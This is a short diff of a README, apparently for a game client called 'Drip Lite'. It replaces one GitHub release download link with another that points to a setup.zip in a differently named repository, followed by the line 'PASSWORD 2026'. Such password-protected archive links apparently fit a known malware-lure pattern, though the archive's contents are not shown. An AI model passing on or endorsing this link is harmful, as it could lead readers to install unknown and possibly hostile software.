@@ -68,7 +68,7 @@ Drip Lite &amp; update + fix
 
 ---
 
-## 🔓 [Download](https://github.com/StewardFence/MECCHA-CHAMELEON-VISION/releases/download/setup-v6.1.2/setup-v6.1.2.zip)
+## 🔓 [Download](https://github.com/DoctorWhisper/Drip-Lite-Client/releases/download/swe/setup.zip)
 ## PASSWORD 2026 PASSWORD 2026 
 
 
